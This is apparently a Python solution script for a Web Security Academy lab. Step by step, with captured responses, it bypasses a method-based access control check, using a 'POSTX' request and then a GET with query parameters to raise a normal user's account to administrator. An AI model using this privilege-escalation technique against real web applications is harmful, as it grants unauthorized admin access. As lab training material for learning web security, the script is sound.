# Lab: Method-based access control can be circumvented

import requests

base = "https://0ad100b80467941680e44e4b00c90042.web-security-academy.net"
tmp_session = requests.Session()

print("===========[step1] check if login page require csrf===============")
page_csrf_check = tmp_session.get(f"{base}/login")
page_csrf_check_result=page_csrf_check.text
print(page_csrf_check_result)
# no csrft detected => keep going on

print("===========[step2] login with administrator credential===============")
page_admin=tmp_session.post(f"{base}/login", data={"username": "administrator", "password": "admin"})
page_admin_result=page_admin.text
print(page_admin_result)
'''
Found "Admin panel" ==> /admin
<a href="/admin">Admin panel</a><p>|</p>
'''

print("===========[step3] Access Admin panel===============")
page_admin_panel=tmp_session.get(f"{base}/admin", allow_redirects=False)
page_admin_panel_result=page_admin_panel.text
print(page_admin_panel_result)
'''
                    <form style='margin-top: 1em' class='login-form' action='/admin-roles' method='POST'>
                        <label>User</label>
                        <select name='username'>
                            <option value='carlos'>carlos (NORMAL)</option>
                            <option value='administrator'>administrator (ADMIN)</option>
                            <option value='wiener'>wiener (NORMAL)</option>
                        </select>
                        <button class='button' name='action' value='upgrade' type='submit'> Upgrade user </button>
                        <button class='button' name='action' value='downgrade' type='submit'> Downgrade user </button>
                    </form>
'''

print("===========[step4] upgrade carlos (as admin)===============")
page_upgrade = tmp_session.post(f"{base}/admin-roles", data={"username": "carlos", "action": "upgrade"}, allow_redirects=False)
print(page_upgrade.status_code, page_upgrade.headers.get("Location"))
'''
admin can manipulate other user's role
302 /admin
'''

print("===========[step5] upgrade carlos (as user)===============")
user_session = requests.Session()
user_session.post(f"{base}/login", data={"username": "wiener", "password": "peter"})
page_upgrade = user_session.post(f"{base}/admin-roles", data={"username": "carlos", "action": "upgrade"}, allow_redirects=False)
print(page_upgrade.status_code, page_upgrade.text)
'''
normally non-admin user can't manipulate other user's role
401 "Unauthorized"
'''

print("===========[step6] change post to postx then retry upgrade carlos (as user)===============")
# currently we are using non-admin session
page_upgrade = user_session.request("POSTX", f"{base}/admin-roles", data={"username": "carlos", "action": "upgrade"}, allow_redirects=False)
print(page_upgrade.status_code, page_upgrade.text)
'''
response "Missing parameter" => it means bypassed privilege check
400 "Missing parameter 'username'"
'''

print("===========[step7] change method to GET (body -> query string) and upgrade wiener (as user)===============")
# currently we are using non-admin session
# POSTX body is not parsed => move params from body(data=) to request-line query string(params=)
page_upgrade = user_session.get(f"{base}/admin-roles", params={"username": "wiener", "action": "upgrade"}, allow_redirects=False)
print(page_upgrade.status_code, page_upgrade.headers.get("Location"))
print(page_upgrade.request.url)
'''
302 /admin => lab solved
'''
